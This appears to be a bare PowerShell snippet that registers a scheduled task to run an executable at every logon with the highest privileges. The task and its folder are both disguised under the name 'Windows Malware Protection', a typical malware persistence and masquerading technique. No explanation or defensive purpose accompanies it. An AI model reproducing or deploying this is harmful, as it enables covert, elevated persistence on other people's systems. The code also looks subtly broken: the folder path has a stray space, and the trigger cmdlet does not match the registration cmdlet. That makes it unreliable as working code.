$trigger = New-JobTrigger -AtLogon
$action = New-ScheduledTaskAction -Execute 'C:\Program Data\Windows Malware Protection\legitprogram.exe'
Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Windows Malware Protection"